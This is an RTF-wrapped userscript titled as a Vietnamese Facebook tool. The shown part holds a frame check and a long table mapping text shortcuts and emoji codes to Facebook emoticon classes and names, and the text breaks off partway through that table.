{\rtf1\ansi\deff0{\fonttbl{\f0\fswiss\fcharset0 Arial;}{\f1\fswiss\fcharset238{\*\fname Arial;}Arial CE;}}
{\*\generator Msftedit 5.41.15.1507;}\viewkind4\uc1\pard\lang1033\f0\fs20 // ==UserScript==\par
// @name            C\'e0i \'d0\u7863?t Tool Facebook cho Trang C\'e1 Nh\'e2n ( Ver 1.4.7 )\par
// @description     All about facebook By T\'fa T\'e0i\par
// @include         https://*.facebook.com/*\par
// @include         https://*.facebook.com/*/*\par
// @include         http://*.facebook.com/*\par
// @include         http://*.facebook.com/*/*\par
// ==/UserScript==\par
// ==13470X==\par
// ==============\par
// ==Icon==\par
(function() \{\par
\tab // Active only in main frame\par
\tab if (!document.querySelector("#pageNav")) \{\par
\tab\tab return;\par
\tab\}\par
\tab //console.info("Extra Facebook Smileys");\par
\par
\tab // = Data =======\par
\tab var emoticons = [ \{ // Text to picture emoticons\par
"chars" : " :) ",\par
\tab\tab "class" : "emoticon_smile",\par
\tab\tab "name" : "Smiley"\par
\tab\}, \{\par
\tab\tab "chars" : " :( ",\par
\tab\tab "class" : "emoticon_frown",\par
\tab\tab "name" : "Frown"\par
\tab\}, \{\par
\tab\tab "chars" : " :P ",\par
\tab\tab "class" : "emoticon_tongue",\par
\tab\tab "name" : "Tongue"\par
\tab\}, \{\par
        "chars" : " :D ",\par
\tab\tab "class" : "emoticon_grin",\par
\tab\tab "name" : "Grin"\par
\tab\}, \{\par
\tab\tab "chars" : " :o ",\par
\tab\tab "class" : "emoticon_gasp",\par
\tab\tab "name" : "Gasp"\par
\tab\}, \{\par
\tab\tab "chars" : " ;) ",\par
\tab\tab "class" : "emoticon_wink",\par
\tab\tab "name" : "Wink"\par
\tab\}, \{\par
\tab\tab "chars" : " :v ",\par
\tab\tab "class" : "emoticon_pacman",\par
\tab\tab "name" : "Pacman"\par
\tab\}, \{\par
\tab\tab "chars" : " >:( ",\par
\tab\tab "class" : "emoticon_grumpy",\par
\tab\tab "name" : "Gru\'c3\'b1\'c3\'b3n"\par
\tab\}, \{\par
\tab\tab "chars" : " :/ ",\par
\tab\tab "class" : "emoticon_unsure",\par
\tab\tab "name" : "Unsure"\par
\tab\}, \{\par
\tab\tab "chars" : " :'( ",\par
\tab\tab "class" : "emoticon_cry",\par
\tab\tab "name" : "Cry"\par
\tab\}, \{\par
\tab\tab "chars" : " ^_^ ",\par
\tab\tab "class" : "emoticon_kiki",\par
\tab\tab "name" : "Kiki"\par
\tab\}, \{\par
\tab\tab "chars" : " 8) ",\par
\tab\tab "class" : "emoticon_glasses",\par
\tab\tab "name" : "Glasses"\par
\tab\}, \{\par
\tab\tab "chars" : " B| ",\par
\tab\tab "class" : "emoticon_sunglasses",\par
\tab\tab "name" : "Sunglasses"\par
\tab\}, \{\par
\tab\tab "chars" : " <3 ",\par
\tab\tab "class" : "emoticon_heart",\par
\tab\tab "name" : "Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " 3:) ",\par
\tab\tab "class" : "emoticon_devil",\par
\tab\tab "name" : "Devil"\par
\tab\}, \{\par
\tab\tab "chars" : " O:) ",\par
\tab\tab "class" : "emoticon_angel",\par
\tab\tab "name" : "Angel"\par
\tab\}, \{\par
\tab\tab "chars" : " -_- ",\par
\tab\tab "class" : "emoticon_squint",\par
\tab\tab "name" : "Squint"\par
\tab\}, \{\par
\tab\tab "chars" : " o.O ",\par
\tab\tab "class" : "emoticon_confused",\par
\tab\tab "name" : "Confused"\par
\tab\}, \{\par
\tab\tab "chars" : " >:o ",\par
\tab\tab "class" : "emoticon_upset",\par
\tab\tab "name" : "Upset"\par
\tab\}, \{\par
\tab\tab "chars" : " :3 ",\par
\tab\tab "class" : "emoticon_colonthree",\par
\tab\tab "name" : "Colonthree"\par
\tab\}, \{\par
\tab\tab "chars" : " (y) ",\par
\tab\tab "class" : "emoticon_like",\par
\tab\tab "name" : "Like"\par
\tab\}, \{\par
\tab\tab "chars" : " :* ",\par
\tab\tab "class" : "emoticon emoticon_kiss",\par
\tab\tab "name" : "Kiss"\par
\tab\}, \{\par
\tab\tab "chars" : " (^^^) ",\par
\tab\tab "class" : "emoticon_shark",\par
\tab\tab "name" : "Shark"\par
\tab\}, \{\par
\tab\tab "chars" : " :|] ",\par
\tab\tab "class" : "emoticon_robot",\par
\tab\tab "name" : "Robot"\par
\tab\}, \{\par
\tab\tab "chars" : " <(\\") ",\par
\tab\tab "class" : "emoticon_penguin",\par
\tab\tab "name" : "Ping\'c3\'bcino"\par
\tab\}, \{\par
\tab\tab "chars" : " :poop: ",\par
\tab\tab "class" : "emoticon_poop",\par
\tab\tab "name" : "Poop"\par
        \}, \{\par
\tab\tab "chars" : " :putnam: ",\par
\tab\tab "class" : "emoticon_putnam",\par
\tab\tab "name" : "Putman"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf02 ",\par
\tab\tab "class" : "_1az _1a- _2c0",\par
\tab\tab "name" : "Pink Umbrella"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf0a ",\par
\tab\tab "class" : "_1az _1a- _2c1",\par
\tab\tab "name" : "Sea Wave"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf19 ",\par
\tab\tab "class" : "_1az _1a- _2c2",\par
\tab\tab "name" : "Crescent moon"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf1f ",\par
\tab\tab "class" : "_1az _1a- _2c3",\par
\tab\tab "name" : "Bright Star"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf31 ",\par
\tab\tab "class" : "_1az _1a- _2c4",\par
\tab\tab "name" : "Seedbed"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf34 ",\par
\tab\tab "class" : "_1az _1a- _2c5",\par
\tab\tab "name" : "Single Palm Tree"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf35 ",\par
\tab\tab "class" : "_1az _1a- _2c6",\par
\tab\tab "name" : "Cactus"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf37 ",\par
\tab\tab "class" : "_1az _1a- _2c7",\par
\tab\tab "name" : "Tulip"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf38 ",\par
\tab\tab "class" : "_1az _1a- _2c8",\par
\tab\tab "name" : "Cherry Blossom"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf39 ",\par
\tab\tab "class" : "_1az _1a- _2c9",\par
\tab\tab "name" : "Rose"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf3a ",\par
\tab\tab "class" : "_1az _1a- _2ca",\par
\tab\tab "name" : "Cayenne"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf3b ",\par
\tab\tab "class" : "_1az _1a- _2cb",\par
\tab\tab "name" : "Sunflower"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf3e ",\par
\tab\tab "class" : "_1az _1a- _2cc",\par
\tab\tab "name" : "Ear Of Rice"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf40 ",\par
\tab\tab "class" : "_1az _1a- _2cd",\par
\tab\tab "name" : "Four Leaf Clover"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf41 ",\par
\tab\tab "class" : "_1az _1a- _2ce",\par
\tab\tab "name" : "Maple Leaf"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf42 ",\par
\tab\tab "class" : "_1az _1a- _2cf",\par
\tab\tab "name" : "Fallen Leaf"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf43 ",\par
\tab\tab "class" : "_1az _1a- _2cg",\par
\tab\tab "name" : "Leaf Floating In The Wind"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf4a ",\par
\tab\tab "class" : "_1az _1a- _2ch",\par
\tab\tab "name" : "Tangerine"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf4e ",\par
\tab\tab "class" : "_1az _1a- _2ci",\par
\tab\tab "name" : "Red Apple"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf53 ",\par
\tab\tab "class" : "_1az _1a- _2cj",\par
\tab\tab "name" : "Strawberry"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf54 ",\par
\tab\tab "class" : "_1az _1a- _2ck",\par
\tab\tab "name" : "Burger"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf78 ",\par
\tab\tab "class" : "_1az _1a- _2cl",\par
\tab\tab "name" : "Cocktail Glass"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf7a ",\par
\tab\tab "class" : "_1az _1a- _2cm",\par
\tab\tab "name" : "Tankard"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf81 ",\par
\tab\tab "class" : "_1az _1a- _2cn",\par
\tab\tab "name" : "Gift Wrapped"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf83 ",\par
\tab\tab "class" : "_1az _1a- _2co",\par
\tab\tab "name" : "Pumpkin With Candle"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf84 ",\par
\tab\tab "class" : "_1az _1a- _2cp",\par
\tab\tab "name" : "Christmas Tree"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf85 ",\par
\tab\tab "class" : "_1az _1a- _2cq",\par
\tab\tab "name" : "Santa"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf88 ",\par
\tab\tab "class" : "_1az _1a- _2cr",\par
\tab\tab "name" : "Balloon"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf89 ",\par
\tab\tab "class" : "_1az _1a- _2cs",\par
\tab\tab "name" : "Party Popper"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf8d ",\par
\tab\tab "class" : "_1az _1a- _2ct",\par
\tab\tab "name" : "Pine Decor"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf8e ",\par
\tab\tab "class" : "_1az _1a- _2cu",\par
\tab\tab "name" : "Japanese Dolls"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf8f ",\par
\tab\tab "class" : "_1az _1a- _2cv",\par
\tab\tab "name" : "Carp Streamer"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf90 ",\par
\tab\tab "class" : "_1az _1a- _2cw",\par
\tab\tab "name" : "Wind Chime"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udf93 ",\par
\tab\tab "class" : "_1az _1a- _2cx",\par
\tab\tab "name" : "Graduation Cap"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udfb5 ",\par
\tab\tab "class" : "_1az _1a- _2cy",\par
\tab\tab "name" : "Musical Note"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udfb6 ",\par
\tab\tab "class" : "_1az _1a- _2cz",\par
\tab\tab "name" : "Multiple Musical Notes"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83c\\udfbc ",\par
\tab\tab "class" : "_1az _1a- _2c-",\par
\tab\tab "name" : "Musical Score"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc0d ",\par
\tab\tab "class" : "_1az _1a- _2c_",\par
\tab\tab "name" : "Snake"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc0e ",\par
\tab\tab "class" : "_1az _1a- _2d0",\par
\tab\tab "name" : "Horse"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc11 ",\par
\tab\tab "class" : "_1az _1a- _2d1",\par
\tab\tab "name" : "Sheep"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc12 ",\par
\tab\tab "class" : "_1az _1a- _2d2",\par
\tab\tab "name" : "Monkey"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc14 ",\par
\tab\tab "class" : "_1az _1a- _2d3",\par
\tab\tab "name" : "Hen"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc17 ",\par
\tab\tab "class" : "_1az _1a- _2d4",\par
\tab\tab "name" : "Wild Boar"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc18 ",\par
\tab\tab "class" : "_1az _1a- _2d5",\par
\tab\tab "name" : "Elephant"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc19 ",\par
\tab\tab "class" : "_1az _1a- _2d6",\par
\tab\tab "name" : "Octopus"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc1a ",\par
\tab\tab "class" : "_1az _1a- _2d7",\par
\tab\tab "name" : "Snail Shell"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc1b ",\par
\tab\tab "class" : "_1az _1a- _2d8",\par
\tab\tab "name" : "Insect"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc1f ",\par
\tab\tab "class" : "_1az _1a- _2d9",\par
\tab\tab "name" : "Fish"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc20 ",\par
\tab\tab "class" : "_1az _1a- _2da",\par
\tab\tab "name" : "Tropical Fish"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc21 ",\par
\tab\tab "class" : "_1az _1a- _2db",\par
\tab\tab "name" : "Pufferfish"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc25 ",\par
\tab\tab "class" : "_1az _1a- _2dc",\par
\tab\tab "name" : "Chick In Front"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc26 ",\par
\tab\tab "class" : "_1az _1a- _2dd",\par
\tab\tab "name" : "Bird"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc27 ",\par
\tab\tab "class" : "_1az _1a- _2de",\par
\tab\tab "name" : "Penguin"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc28 ",\par
\tab\tab "class" : "_1az _1a- _2df",\par
\tab\tab "name" : "Koala"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc29 ",\par
\tab\tab "class" : "_1az _1a- _2dg",\par
\tab\tab "name" : "Poodle"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc2b ",\par
\tab\tab "class" : "_1az _1a- _2dh",\par
\tab\tab "name" : "Bactrian Camel"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc2c ",\par
\tab\tab "class" : "_1az _1a- _2di",\par
\tab\tab "name" : "Dolphin"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc2d ",\par
\tab\tab "class" : "_1az _1a- _2dj",\par
\tab\tab "name" : "Mouse Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc2e ",\par
\tab\tab "class" : "_1az _1a- _2dk",\par
\tab\tab "name" : "Cow Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc2f ",\par
\tab\tab "class" : "_1az _1a- _2dl",\par
\tab\tab "name" : "Cara de tigre"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc30 ",\par
\tab\tab "class" : "_1az _1a- _2dm",\par
\tab\tab "name" : "Rabbit Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc31 ",\par
\tab\tab "class" : "_1az _1a- _2dn",\par
\tab\tab "name" : "Cat Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc33 ",\par
\tab\tab "class" : "_1az _1a- _2do",\par
\tab\tab "name" : "Whale Sputtering"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc34 ",\par
\tab\tab "class" : "_1az _1a- _2dp",\par
\tab\tab "name" : "Horse Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc35 ",\par
\tab\tab "class" : "_1az _1a- _2dq",\par
\tab\tab "name" : "Monkey Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc37 ",\par
\tab\tab "class" : "_1az _1a- _2dr",\par
\tab\tab "name" : "Pig face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc38 ",\par
\tab\tab "class" : "_1az _1a- _2ds",\par
\tab\tab "name" : "Frog Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc39 ",\par
\tab\tab "class" : "_1az _1a- _2dt",\par
\tab\tab "name" : "Hamster Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc3a ",\par
\tab\tab "class" : "_1az _1a- _2du",\par
\tab\tab "name" : "Wolf Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc3b ",\par
\tab\tab "class" : "_1az _1a- _2dv",\par
\tab\tab "name" : "Bear Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc3e ",\par
\tab\tab "class" : "_1az _1a- _2dw",\par
\tab\tab "name" : "Footprints"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc40 ",\par
\tab\tab "class" : "_1az _1a- _2dx",\par
\tab\tab "name" : "Eyes"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc42 ",\par
\tab\tab "class" : "_1az _1a- _2dy",\par
\tab\tab "name" : "Ear"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc43 ",\par
\tab\tab "class" : "_1az _1a- _2dz",\par
\tab\tab "name" : "Nose"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc44 ",\par
\tab\tab "class" : "_1az _1a- _2d-",\par
\tab\tab "name" : "Mouth"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc45 ",\par
\tab\tab "class" : "_1az _1a- _2d_",\par
\tab\tab "name" : "Sour Face"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc46 ",\par
\tab\tab "class" : "_1az _1a- _2e0",\par
\tab\tab "name" : "White hand pointing up"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc47 ",\par
\tab\tab "class" : "_1az _1a- _2e1",\par
\tab\tab "name" : "White hand faces downward"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc48 ",\par
\tab\tab "class" : "_1az _1a- _2e2",\par
\tab\tab "name" : "White hand indicating left"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc49 ",\par
\tab\tab "class" : "_1az _1a- _2e3",\par
\tab\tab "name" : "White hand indicating right"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4a ",\par
\tab\tab "class" : "_1az _1a- _2e4",\par
\tab\tab "name" : "Fist"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4b ",\par
\tab\tab "class" : "_1az _1a- _2e5",\par
\tab\tab "name" : "Hand in motion"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4c ",\par
\tab\tab "class" : "_1az _1a- _2e6",\par
\tab\tab "name" : "Hand showing all good"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4d ",\par
\tab\tab "class" : "_1az _1a- _2e7",\par
\tab\tab "name" : "Hand with thumb up"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4e ",\par
\tab\tab "class" : "_1az _1a- _2e8",\par
\tab\tab "name" : "Hand with thumb down"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc4f ",\par
\tab\tab "class" : "_1az _1a- _2e9",\par
\tab\tab "name" : "Hands clapping"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc50 ",\par
\tab\tab "class" : "_1az _1a- _2ea",\par
\tab\tab "name" : "Open Hands"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc66 ",\par
\tab\tab "class" : "_1az _1a- _2eb",\par
\tab\tab "name" : "Boy"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc67 ",\par
\tab\tab "class" : "_1az _1a- _2ec",\par
\tab\tab "name" : "Girl"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc68 ",\par
\tab\tab "class" : "_1az _1a- _2ed",\par
\tab\tab "name" : "Man"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc69 ",\par
\tab\tab "class" : "_1az _1a- _2ee",\par
\tab\tab "name" : "Woman"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc6b ",\par
\tab\tab "class" : "_1az _1a- _2ef",\par
\tab\tab "name" : "Man and woman holding hands"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc6e ",\par
\tab\tab "class" : "_1az _1a- _2eg",\par
\tab\tab "name" : "Police Officer"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc6f ",\par
\tab\tab "class" : "_1az _1a- _2eh",\par
\tab\tab "name" : "Woman with bunny ears"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc71 ",\par
\tab\tab "class" : "_1az _1a- _2ei",\par
\tab\tab "name" : "Person with hair rubio"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc72 ",\par
\tab\tab "class" : "_1az _1a- _2ej",\par
\tab\tab "name" : "Man with pi mao gua"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc73 ",\par
\tab\tab "class" : "_1az _1a- _2ek",\par
\tab\tab "name" : "Man with turban"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc74 ",\par
\tab\tab "class" : "_1az _1a- _2el",\par
\tab\tab "name" : "Old Man"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc75 ",\par
\tab\tab "class" : "_1az _1a- _2em",\par
\tab\tab "name" : "Old Woman"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc76 ",\par
\tab\tab "class" : "_1az _1a- _2en",\par
\tab\tab "name" : "Baby"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc77 ",\par
\tab\tab "class" : "_1az _1a- _2eo",\par
\tab\tab "name" : "Construction Worker"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc78 ",\par
\tab\tab "class" : "_1az _1a- _2ep",\par
\tab\tab "name" : "Princess"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc7b ",\par
\tab\tab "class" : "_1az _1a- _2eq",\par
\tab\tab "name" : "Ghost"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc7c ",\par
\tab\tab "class" : "_1az _1a- _2er",\par
\tab\tab "name" : "Angel baby"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc7d ",\par
\tab\tab "class" : "_1az _1a- _2es",\par
\tab\tab "name" : "Alien"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc7e ",\par
\tab\tab "class" : "_1az _1a- _2et",\par
\tab\tab "name" : "Alien Monster"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc7f ",\par
\tab\tab "class" : "_1az _1a- _2eu",\par
\tab\tab "name" : "Imp"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc80 ",\par
\tab\tab "class" : "_1az _1a- _2ev",\par
\tab\tab "name" : "Skull"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc82 ",\par
\tab\tab "class" : "_1az _1a- _2ew",\par
\tab\tab "name" : "Guard"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc83 ",\par
\tab\tab "class" : "_1az _1a- _2ex",\par
\tab\tab "name" : "Ballerina"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc85 ",\par
\tab\tab "class" : "_1az _1a- _2ey",\par
\tab\tab "name" : "Nail Polish"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc8b ",\par
\tab\tab "class" : "_1az _1a- _2ez",\par
\tab\tab "name" : "Brand of kiss"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc8f ",\par
\tab\tab "class" : "_1az _1a- _2e-",\par
\tab\tab "name" : "Kissing couple"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc90 ",\par
\tab\tab "class" : "_1az _1a- _2e_",\par
\tab\tab "name" : "Bunch of flowers"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc91 ",\par
\tab\tab "class" : "_1az _1a- _2f0",\par
\tab\tab "name" : "Couple with heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc93 ",\par
\tab\tab "class" : "_1az _1a- _2f1",\par
\tab\tab "name" : "Heart beating"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc94 ",\par
\tab\tab "class" : "_1az _1a- _2f2",\par
\tab\tab "name" : "Broken Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc96 ",\par
\tab\tab "class" : "_1az _1a- _2f3",\par
\tab\tab "name" : "Bright Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc97 ",\par
\tab\tab "class" : "_1az _1a- _2f4",\par
\tab\tab "name" : "Heart growing"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc98 ",\par
\tab\tab "class" : "_1az _1a- _2f5",\par
\tab\tab "name" : "Heart with arrow"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc99 ",\par
\tab\tab "class" : "_1az _1a- _2f6",\par
\tab\tab "name" : "Blue Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc9a ",\par
\tab\tab "class" : "_1az _1a- _2f7",\par
\tab\tab "name" : "Green Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc9b ",\par
\tab\tab "class" : "_1az _1a- _2f8",\par
\tab\tab "name" : "Yellow Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc9c ",\par
\tab\tab "class" : "_1az _1a- _2f9",\par
\tab\tab "name" : "Purple Heart"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udc9d ",\par
\tab\tab "class" : "_1az _1a- _2fa",\par
\tab\tab "name" : "Heart with ribbon"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udca2 ",\par
\tab\tab "class" : "_1az _1a- _2fb",\par
\tab\tab "name" : "Symbol of anger"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udca4 ",\par
\tab\tab "class" : "_1az _1a- _2fc",\par
\tab\tab "name" : "Sleeping"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udca6 ",\par
\tab\tab "class" : "_1az _1a- _2fd",\par
\tab\tab "name" : "Sweat Symbol"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udca8 ",\par
\tab\tab "class" : "_1az _1a- _2fe",\par
\tab\tab "name" : "Quick Start Symbol"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udca9 ",\par
\tab\tab "class" : "_1az _1a- _2ff",\par
\tab\tab "name" : "Pile of Caca"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcaa ",\par
\tab\tab "class" : "_1az _1a- _2fg",\par
\tab\tab "name" : "Flexed bicep"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcbb ",\par
\tab\tab "class" : "_1az _1a- _2fh",\par
\tab\tab "name" : "Personal Computer"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcbd ",\par
\tab\tab "class" : "_1az _1a- _2fi",\par
\tab\tab "name" : "Mini Disco"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcbe ",\par
\tab\tab "class" : "_1az _1a- _2fj",\par
\tab\tab "name" : "Floppy disk"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcbf ",\par
\tab\tab "class" : "_1az _1a- _2fk",\par
\tab\tab "name" : "Optical Disc"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcc0 ",\par
\tab\tab "class" : "_1az _1a- _2fl",\par
\tab\tab "name" : "DVD"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcde ",\par
\tab\tab "class" : "_1az _1a- _2fm",\par
\tab\tab "name" : "Telephone receiver"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udce0 ",\par
\tab\tab "class" : "_1az _1a- _2fn",\par
\tab\tab "name" : "Fax"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcf1 ",\par
\tab\tab "class" : "_1az _1a- _2fo",\par
\tab\tab "name" : "Mobile Phone"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcf2 ",\par
\tab\tab "class" : "_1az _1a- _2fp",\par
\tab\tab "name" : "Mobile phone with arrow from left to right"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udcfa ",\par
\tab\tab "class" : "_1az _1a- _2fq",\par
\tab\tab "name" : "Television"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\udd14 ",\par
\tab\tab "class" : "_1az _1a- _2fr",\par
\tab\tab "name" : "Bell"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude01 ",\par
\tab\tab "class" : "_1az _1a- _2fs",\par
\tab\tab "name" : "Face to face with smiling eyes"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude02 ",\par
\tab\tab "class" : "_1az _1a- _2ft",\par
\tab\tab "name" : "Face with tears of joy"\par
\tab\}, \{\par
\tab\tab "chars" : " \\ud83d\\ude03 ",\par
\tab\tab "class" : "_1az _1a- _2fu",\par
\tab\tab "name" : "Smiley face with open mouth"\par
\tab\}, \{\par
